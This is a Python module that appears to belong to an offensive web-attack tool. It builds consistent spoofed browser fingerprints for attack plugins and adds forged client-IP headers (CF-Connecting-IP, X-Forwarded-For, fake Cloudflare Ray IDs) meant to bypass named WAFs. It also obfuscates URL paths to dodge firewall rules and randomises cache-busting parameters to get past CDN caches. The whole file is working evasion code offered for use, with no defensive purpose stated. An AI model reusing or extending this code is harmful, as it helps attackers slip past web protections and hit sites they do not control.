#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""evasion.composer — Unified Evasion Composer.

W4.5: The EvasionComposer unifies browser identity, headers, TLS fingerprints,
and request evasion into a single deterministic composition engine.

Key Design Principles:
  1. CONSISTENCY: UA + Sec-CH-UA + Accept + Sec-Fetch + TLS all match the same browser
  2. COMPOSITION: Delegates to existing evasion modules rather than reimplementing
  3. DETERMINISM: Same profile selection → same complete identity
  4. PROTOCOL: Implements EvasionProtocol for type-safe integration with AttackPlugin

This module does NOT replace EvasionManagerStub yet. It provides the new
interface that will gradually replace it. During migration, both coexist.
"""
from __future__ import annotations

import random
import time
import string
from typing import Dict, List, Any, Optional, Protocol, runtime_checkable
from urllib.parse import urlparse, quote

from logging_config import get_logger
logger = get_logger(__name__)


# ═══════════════════════════════════════════════════════════════════════════════
# Evasion Protocol — The interface vf_attack_base.py expects
# ═══════════════════════════════════════════════════════════════════════════════

@runtime_checkable
class EvasionProtocol(Protocol):
    """Protocol defining the evasion interface for attack plugins.

    W4.5: Replaces duck-typing with a formal protocol. All evasion managers
    (EvasionManagerStub, EvasionComposer) must implement this interface.

    This allows vf_attack_base.py to use isinstance() checks instead of
    hasattr() checks, and enables IDE autocompletion + type checking.
    """

    def request_headers(self, request_type: str = "document") -> Dict[str, str]:
        """Get headers customized for a specific request type."""
        ...

    def base_headers(self) -> Dict[str, str]:
        """Return base request headers with realistic browser fingerprint."""
        ...

    def update_cookies(self, cookies: Dict[str, str]) -> None:
        """Update cookie session from response Set-Cookie headers."""
        ...

    def get_cookies(self) -> Dict[str, str]:
        """Get current session cookies."""
        ...

    def set_waf(self, waf_name: str) -> None:
        """Set detected WAF name for WAF-specific bypass headers."""
        ...

    def obfuscate_url(self, url: str) -> str:
        """Obfuscate a URL's path component to bypass WAF rules."""
        ...

    def get_cache_busted_url(self, url: str) -> str:
        """Get a cache-busted version of a URL."""
        ...


# ═══════════════════════════════════════════════════════════════════════════════
# Unified Browser Identity Database
# ═══════════════════════════════════════════════════════════════════════════════

# W4.5: Single source of truth for browser profiles.
# Each profile has COMPLETE identity: UA + Sec-CH-UA + Accept headers for all
# content types + Sec-Fetch defaults + TLS fingerprint hints.
# This eliminates contradictory signals between headers.

UNIFIED_BROWSER_PROFILES = [
    {
        "name": "chrome_120_win",
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "sec_ch_ua_platform": '"Windows"',
        "sec_ch_ua_mobile": "?0",
        "accept_html": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept_json": "application/json, text/plain, */*",
        "accept_img": "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
        "accept_css": "text/css,*/*;q=0.1",
        "sec_fetch_dest_doc": "document",
        "sec_fetch_mode_nav": "navigate",
        "sec_fetch_site_cross": "cross-site",
        "sec_fetch_site_same": "same-origin",
        # TLS fingerprint hints (from vf_fp_cloner BROWSER_PROFILES)
        "tls_version": "TLSv1.3",
        "alpn": ["h2", "http/1.1"],
        "cipher_suites": "chrome_modern",
    },
    {
        "name": "chrome_120_mac",
        "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "sec_ch_ua_platform": '"macOS"',
        "sec_ch_ua_mobile": "?0",
        "accept_html": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept_json": "application/json, text/plain, */*",
        "accept_img": "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
        "accept_css": "text/css,*/*;q=0.1",
        "sec_fetch_dest_doc": "document",
        "sec_fetch_mode_nav": "navigate",
        "sec_fetch_site_cross": "cross-site",
        "sec_fetch_site_same": "same-origin",
        "tls_version": "TLSv1.3",
        "alpn": ["h2", "http/1.1"],
        "cipher_suites": "chrome_modern",
    },
    {
        "name": "firefox_121_win",
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "sec_ch_ua": None,
        "sec_ch_ua_platform": None,
        "sec_ch_ua_mobile": None,
        "accept_html": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "accept_json": "application/json, text/plain, */*",
        "accept_img": "image/avif,image/webp,*/*;q=0.8",
        "accept_css": "text/css,*/*;q=0.1",
        "sec_fetch_dest_doc": "document",
        "sec_fetch_mode_nav": "navigate",
        "sec_fetch_site_cross": "cross-site",
        "sec_fetch_site_same": "same-origin",
        "tls_version": "TLSv1.3",
        "alpn": ["h2", "http/1.1"],
        "cipher_suites": "firefox_modern",
    },
    {
        "name": "safari_17_mac",
        "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
        "sec_ch_ua": None,
        "sec_ch_ua_platform": None,
        "sec_ch_ua_mobile": None,
        "accept_html": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept_json": "application/json, text/plain, */*",
        "accept_img": "image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5",
        "accept_css": "text/css,*/*;q=0.1",
        "sec_fetch_dest_doc": "document",
        "sec_fetch_mode_nav": "navigate",
        "sec_fetch_site_cross": "cross-site",
        "sec_fetch_site_same": "same-origin",
        "tls_version": "TLSv1.3",
        "alpn": ["h2", "http/1.1"],
        "cipher_suites": "safari_modern",
    },
    {
        "name": "edge_120_win",
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
        "sec_ch_ua_platform": '"Windows"',
        "sec_ch_ua_mobile": "?0",
        "accept_html": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept_json": "application/json, text/plain, */*",
        "accept_img": "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
        "accept_css": "text/css,*/*;q=0.1",
        "sec_fetch_dest_doc": "document",
        "sec_fetch_mode_nav": "navigate",
        "sec_fetch_site_cross": "cross-site",
        "sec_fetch_site_same": "same-origin",
        "tls_version": "TLSv1.3",
        "alpn": ["h2", "http/1.1"],
        "cipher_suites": "chrome_modern",
    },
]


# ═══════════════════════════════════════════════════════════════════════════════
# WAF Bypass Header Templates
# ═══════════════════════════════════════════════════════════════════════════════

# W4.5: Moved from vf_evasion_stub.py — canonical source
WAF_BYPASS_HEADERS = {
    "cloudflare": [
        {"CF-Connecting-IP": "{rand_ip}"},
        {"X-Real-IP": "{rand_ip}"},
        {"CF-RAY": "{rand_ray}"},
    ],
    "arvancloud": [
        {"X-Forwarded-For": "{rand_ip}"},
        {"X-Real-IP": "{rand_ip}"},
    ],
    "generic": [
        {"X-Forwarded-For": "{rand_ip}"},
        {"X-Real-IP": "{rand_ip}"},
        {"X-Forwarded-Host": "{domain}"},
        {"X-Forwarded-Proto": "{scheme}"},
    ],
}


def _rand_ip() -> str:
    """Generate a realistic random public IP address."""
    first = random.choice([1, 2, 5, 8, 14, 23, 24, 31, 37, 46, 49,
                           58, 62, 77, 78, 80, 83, 85, 89, 91, 93,
                           95, 101, 103, 104, 106, 109, 110, 111, 115,
                           116, 119, 120, 121, 122, 123, 124, 125, 128,
                           129, 130, 132, 134, 136, 137, 138, 140, 141,
                           143, 144, 145, 146, 148, 149, 150, 151, 152,
                           153, 155, 157, 158, 159, 160, 162, 163, 164,
                           165, 166, 167, 168, 170, 171, 172, 173, 174,
                           176, 177, 178, 179, 180, 181, 182, 183, 185,
                           186, 187, 188, 189, 190, 191, 192, 193, 194,
                           195, 196, 197, 198, 199, 200, 201, 202, 203,
                           204, 205, 206, 207, 208, 209, 210, 211, 212,
                           213, 214, 215, 216, 217, 218, 219, 220, 221,
                           222, 223])
    return f"{first}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


def _rand_cf_ray() -> str:
    """Generate a fake Cloudflare Ray ID."""
    return ''.join(random.choices('0123456789abcdef', k=16))


# ═══════════════════════════════════════════════════════════════════════════════
# Path Obfuscation — Copied from vf_evasion_stub.py (canonical source moves here)
# ═══════════════════════════════════════════════════════════════════════════════

def obfuscate_path(path: str, waf_name: str = "") -> str:
    """Obfuscate a URL path to bypass WAF URL-based rules.

    W4.5: Moved from vf_evasion_stub.py — canonical source.

    Many WAFs have rules based on URL patterns (e.g., block /admin,
    block /wp-login.php). Path obfuscation makes the same endpoint
    look different to the WAF while still reaching the server.

    Techniques:
    - URL encoding: /admin → /%61dmin
    - Double URL encoding: /admin → /%2561dmin
    - Path traversal: /admin → /./admin or /x/../admin
    - Fragment injection: /admin → /admin#section
    - Case mixing: /admin → /Admin (works on case-insensitive servers)
    - Semicolon injection: /admin → /admin;param (some servers ignore after ;)
    - Dot suffix: /admin → /admin. (some servers strip trailing dots)

    Args:
        path: The URL path to obfuscate (e.g., "/admin/login")
        waf_name: The detected WAF name for WAF-specific obfuscation

    Returns:
        Obfuscated path string
    """
    if not path or path == "/":
        return path

    # Choose an obfuscation technique (randomly to vary fingerprint)
    technique = random.choice([
        "none", "url_encode", "double_slash", "dot_segment",
        "semicolon", "dot_suffix", "fragment",
    ])

    # WAF-specific: Cloudflare and ArvanCloud normalize most path tricks,
    # so for them we prefer URL encoding and fragment injection
    if waf_name in ("cloudflare", "arvancloud"):
        technique = random.choice(["none", "url_encode", "fragment", "semicolon"])

    if technique == "none":
        return path

    elif technique == "url_encode":
        # URL-encode the first path segment character
        # /admin → /%61dmin (a = 0x61)
        parts = path.split("/")
        if len(parts) >= 2 and parts[1]:
            first_char = parts[1][0]
            if first_char.isalpha():
                parts[1] = f"%{ord(first_char):02x}{parts[1][1:]}"
                return "/".join(parts)
        return path

    elif technique == "double_slash":
        # Insert double slash: /admin → //admin
        # Some servers normalize this, but WAFs may not check
        return "/" + path

    elif technique == "dot_segment":
        # Insert dot segment: /admin → /./admin or /x/../admin
        if random.random() < 0.5:
            return "/." + path
        else:
            rand_seg = ''.join(random.choices(string.ascii_lowercase, k=3))
            return f"/{rand_seg}/..{path}"

    elif technique == "semicolon":
        # Semicolon injection: /admin → /admin;param
        rand_param = ''.join(random.choices(string.ascii_lowercase, k=4))
        # Insert before any query string
        if "?" in path:
            before, after = path.split("?", 1)
            return f"{before};{rand_param}?{after}"
        return f"{path};{rand_param}"

    elif technique == "dot_suffix":
        # Trailing dot: /admin → /admin.
        # IIS and some servers strip trailing dots
        if "?" in path:
            before, after = path.split("?", 1)
            return f"{before}.?{after}"
        return f"{path}."

    elif technique == "fragment":
        # Fragment injection: /admin → /admin#section
        # Fragments aren't sent to server, but WAFs may cache differently
        rand_frag = ''.join(random.choices(string.ascii_lowercase, k=5))
        if "#" in path:
            return path  # Already has fragment
        if "?" in path:
            return f"{path}#{rand_frag}"
        return f"{path}#{rand_frag}"

    return path


def advanced_cache_bust(url: str) -> str:
    """Advanced cache busting with varied patterns.

    W4.5: Moved from vf_evasion_stub.py — canonical source.

    Instead of just appending ?_=timestamp, uses multiple patterns
    to bypass CDN/WAF caching:

    - Query parameter with varied names: ?v=, ?_=, ?t=, ?nocache=, ?rand=
    - Multiple parameters: ?v=X&_=Y
    - Fragment-based (not sent to server but may affect CDN cache key)
    - Path-based: /path/v1234/ (for APIs that use path versioning)

    Args:
        url: The URL to add cache busting to

    Returns:
        URL with cache busting parameter appended
    """
    rand_val = ''.join(random.choices(string.digits, k=random.randint(6, 12)))

    # Choose cache bust pattern
    pattern = random.choice([
        "single_param", "double_param", "varied_name",
    ])

    sep = "&" if "?" in url else "?"

    if pattern == "single_param":
        # Standard: ?_=randval
        return f"{url}{sep}_={rand_val}"

    elif pattern == "double_param":
        # Two parameters for more uniqueness
        rand_val2 = ''.join(random.choices(string.digits, k=6))
        return f"{url}{sep}_={rand_val}&v={rand_val2}"

    elif pattern == "varied_name":
        # Varied parameter name (some WAFs block ?_= specifically)
        param_name = random.choice(["_", "v", "t", "nocache", "rand", "cb", "bust", "x"])
        return f"{url}{sep}{param_name}={rand_val}"

    return f"{url}{sep}_={rand_val}"


# ═══════════════════════════════════════════════════════════════════════════════
# EvasionComposer — The unified composition engine
# ═══════════════════════════════════════════════════════════════════════════════

class EvasionComposer:
    """Unified Evasion Composer — consistent browser identity + evasion.

    W4.5: Composes all evasion signals into a single deterministic identity:
    - Browser fingerprint (UA + Sec-CH-UA + Accept + Sec-Fetch all match)
    - Referer generation (delegates to ReferrerChainSpoofer if available)
    - WAF bypass headers (per-WAF rotation)
    - Path obfuscation + cache busting
    - Cookie session management

    Key improvement over EvasionManagerStub:
    - GUARANTEED consistency: UA + headers + Sec-Fetch always from same profile
    - EvasionManagerStub could mix Chrome UA with Firefox Accept headers
    - This composer picks ONE profile and uses it for ALL signals

    Implements EvasionProtocol for type-safe integration with AttackPlugin.
    """

    def __init__(self, domain: str, url: str, page_targets: List[str],
                 resource_targets: List[str], enable_header_random: bool,
                 enable_ua_rotation: bool):
        self.domain = domain
        self.url = url
        self.is_active = enable_header_random or enable_ua_rotation
        self._enable_ua_rotation = enable_ua_rotation
        self._enable_header_random = enable_header_random

        # Parsed URL info
        parsed = urlparse(url)
        self._scheme = parsed.scheme
        self._origin = f"{parsed.scheme}://{parsed.netloc}"

        # Current identity state — the KEY improvement
        self._current_profile_idx: int = 0
        self._profile_rotation_counter: int = 0
        self._profile_rotation_interval: int = 50  # Rotate profile every N requests

        # WAF detection
        self._waf_name: str = ""
        self._waf_bypass_idx: int = 0

        # Cookie session state
        self._cookies: Dict[str, str] = {}
        self._session_warmed: bool = False

        # Rotation state
        self._request_count: int = 0

        # IP pool for X-Forwarded-For rotation
        self._ip_pool: List[str] = [_rand_ip() for _ in range(50)]

        # Path obfuscation state
        self._obfuscate_count: int = 0

        # Referrer spoofer (lazy init — try to import, fallback to simple)
        self._referrer_spoofer = None
        try:
            from evasion.vf_referrer import ReferrerChainSpoofer
            self._referrer_spoofer = ReferrerChainSpoofer(domain)
        except (ImportError, Exception):
            pass  # Fallback to simple Referer: self.url

    def _get_profile(self) -> dict:
        """Get the current browser profile.

        W4.5 KEY IMPROVEMENT: All signals from the SAME profile.
        When rotation is enabled, periodically switch profiles.
        When disabled, always use profile[0].
        """
        if self._enable_ua_rotation or self._enable_header_random:
            # Rotate profile periodically
            if self._profile_rotation_counter >= self._profile_rotation_interval:
                self._current_profile_idx = random.randint(0, len(UNIFIED_BROWSER_PROFILES) - 1)
                self._profile_rotation_counter = 0
            self._profile_rotation_counter += 1
            return UNIFIED_BROWSER_PROFILES[self._current_profile_idx]
        else:
            return UNIFIED_BROWSER_PROFILES[0]

    def _compose_sec_fetch(self, profile: dict, request_type: str) -> Dict[str, str]:
        """Compose Sec-Fetch-* headers that match the request type AND browser.

        W4.5 KEY IMPROVEMENT: Sec-Fetch headers are always consistent with
        the selected browser profile. No mixing.
        """
        headers = {}
        if request_type == "document":
            headers["Sec-Fetch-Dest"] = profile.get("sec_fetch_dest_doc", "document")
            headers["Sec-Fetch-Mode"] = profile.get("sec_fetch_mode_nav", "navigate")
            headers["Sec-Fetch-Site"] = random.choice([
                profile.get("sec_fetch_site_same", "same-origin"),
                "none",
            ])
            headers["Sec-Fetch-User"] = "?1"
        elif request_type == "api":
            headers["Sec-Fetch-Dest"] = "empty"
            headers["Sec-Fetch-Mode"] = "cors"
            headers["Sec-Fetch-Site"] = random.choice([
                "same-origin",
                profile.get("sec_fetch_site_same", "same-origin"),
                "cross-site",
            ])
        elif request_type == "resource":
            headers["Sec-Fetch-Dest"] = random.choice(["image", "style", "script"])
            headers["Sec-Fetch-Mode"] = "no-cors"
            headers["Sec-Fetch-Site"] = random.choice([
                "same-origin",
                profile.get("sec_fetch_site_same", "same-origin"),
            ])
        elif request_type == "login":
            headers["Sec-Fetch-Dest"] = "document"
            headers["Sec-Fetch-Mode"] = "navigate"
            headers["Sec-Fetch-Site"] = "same-origin"
            headers["Sec-Fetch-User"] = "?1"
        return headers

    def _compose_ch_ua(self, profile: dict) -> Dict[str, str]:
        """Compose Sec-CH-UA headers matching the browser profile.

        W4.5 KEY IMPROVEMENT: Sec-CH-UA is only added for Chromium browsers.
        Firefox/Safari don't send these headers.
        """
        headers = {}
        if profile.get("sec_ch_ua"):
            headers["Sec-CH-UA"] = profile["sec_ch_ua"]
        if profile.get("sec_ch_ua_platform"):
            headers["Sec-CH-UA-Platform"] = profile["sec_ch_ua_platform"]
        if profile.get("sec_ch_ua_mobile") is not None:
            headers["Sec-CH-UA-Mobile"] = profile["sec_ch_ua_mobile"]
        return headers

    def _compose_waf_bypass(self) -> Dict[str, str]:
        """Compose WAF-specific bypass headers."""
        bypass_set = WAF_BYPASS_HEADERS.get(self._waf_name,
                                            WAF_BYPASS_HEADERS["generic"])
        bypass = bypass_set[self._waf_bypass_idx % len(bypass_set)]
        self._waf_bypass_idx += 1

        rand_ip = random.choice(self._ip_pool)
        headers = {}
        for key, template in bypass.items():
            value = template.replace("{rand_ip}", rand_ip)
            value = value.replace("{domain}", self.domain)
            value = value.replace("{scheme}", self._scheme)
            value = value.replace("{rand_ray}", _rand_cf_ray())
            headers[key] = value
        return headers

    def _get_referer(self, path: str = "/") -> str:
        """Get a realistic Referer header.

        Delegates to ReferrerChainSpoofer if available, otherwise
        uses simple self.url fallback.
        """
        if self._referrer_spoofer:
            try:
                return self._referrer_spoofer.get_referer(path)
            except Exception:
                pass
        return self.url

    # ─── EvasionProtocol Implementation ───

    def base_headers(self) -> Dict[str, str]:
        """Return base request headers with consistent browser fingerprint."""
        profile = self._get_profile()

        headers = {
            "User-Agent": profile["ua"],
            "Accept": profile["accept_html"],
            "Accept-Language": random.choice([
                "en-US,en;q=0.9",
                "en-US,en;q=0.8,en;q=0.7",
                "fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7",
                "en-US,en;q=0.5",
            ]),
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Referer": self._get_referer(),
            "Upgrade-Insecure-Requests": "1",
        }

        # Add Sec-CH-UA (only for Chromium browsers)
        headers.update(self._compose_ch_ua(profile))

        # Add Sec-Fetch headers (consistent with profile)
        headers.update(self._compose_sec_fetch(profile, "document"))

        # Cache control
        headers["Cache-Control"] = "max-age=0"

        return headers

    def request_headers(self, request_type: str = "document") -> Dict[str, str]:
        """Get headers customized for a specific request type.

        W4.5 KEY IMPROVEMENT: All headers come from the SAME browser profile.
        The Accept header matches the UA's browser. The Sec-CH-UA matches
        the UA. The Sec-Fetch headers are correct for the request type.
        No contradictory signals.
        """
        profile = self._get_profile()

        headers = {
            "User-Agent": profile["ua"],
            "Accept-Language": random.choice([
                "en-US,en;q=0.9",
                "en-US,en;q=0.8,en;q=0.7",
                "fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7",
            ]),
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Referer": self._get_referer(),
        }

        # Type-specific Accept header (from the SAME profile)
        if request_type == "document":
            headers["Accept"] = profile["accept_html"]
            headers["Upgrade-Insecure-Requests"] = "1"
            headers["Cache-Control"] = "max-age=0"
        elif request_type == "api":
            headers["Accept"] = profile["accept_json"]
            headers["Origin"] = self._origin
        elif request_type == "resource":
            headers["Accept"] = profile["accept_img"]
            headers["Cache-Control"] = "no-cache"
        elif request_type == "login":
            headers["Accept"] = profile["accept_html"]
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            headers["Origin"] = self._origin
            headers["Cache-Control"] = "max-age=0"

        # Add Sec-CH-UA (only for Chromium browsers)
        headers.update(self._compose_ch_ua(profile))

        # Add Sec-Fetch headers (consistent with profile + request type)
        headers.update(self._compose_sec_fetch(profile, request_type))

        # WAF bypass headers
        self._request_count += 1
        headers.update(self._compose_waf_bypass())

        return headers

    def update_cookies(self, cookies: Dict[str, str]) -> None:
        """Update cookie session from response Set-Cookie headers."""
        self._cookies.update(cookies)

    def get_cookies(self) -> Dict[str, str]:
        """Get current session cookies."""
        return dict(self._cookies)

    def set_waf(self, waf_name: str) -> None:
        """Set detected WAF name for WAF-specific bypass headers."""
        self._waf_name = (waf_name or "").lower()

    def obfuscate_url(self, url: str) -> str:
        """Obfuscate a URL's path component to bypass WAF rules."""
        self._obfuscate_count += 1
        if random.random() > 0.30:
            return url
        try:
            parsed = urlparse(url)
            path = parsed.path or "/"
            obfuscated_path = obfuscate_path(path, self._waf_name)
            if obfuscated_path == path:
                return url
            result = f"{parsed.scheme}://{parsed.netloc}{obfuscated_path}"
            if parsed.query:
                result += f"?{parsed.query}"
            return result
        except (ValueError, KeyError, IndexError):
            return url

    def get_cache_busted_url(self, url: str) -> str:
        """Get a cache-busted version of a URL."""
        return advanced_cache_bust(url)

    def get_stats(self) -> Dict[str, Any]:
        """Return composer statistics."""
        return {
            "active": self.is_active,
            "ua_rotation": self._enable_ua_rotation,
            "header_random": self._enable_header_random,
            "waf_name": self._waf_name,
            "request_count": self._request_count,
            "cookies_count": len(self._cookies),
            "has_referrer_spoofer": self._referrer_spoofer is not None,
            "current_profile": UNIFIED_BROWSER_PROFILES[self._current_profile_idx]["name"],
        }

    def get_current_profile(self) -> dict:
        """Get the current browser profile (for TLS fingerprint matching)."""
        return UNIFIED_BROWSER_PROFILES[self._current_profile_idx]


__all__ = [
    "EvasionProtocol",
    "EvasionComposer",
    "UNIFIED_BROWSER_PROFILES",
    "WAF_BYPASS_HEADERS",
    "obfuscate_path",
    "advanced_cache_bust",
]
